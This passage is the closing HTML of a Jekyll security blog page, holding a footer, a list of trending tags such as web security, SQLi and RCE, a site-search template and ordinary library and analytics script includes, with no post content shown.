href="https://twitter.com/s4yhii">Jesus Lujan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-V0V53P7YVQ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-V0V53P7YVQ'); }); </script>
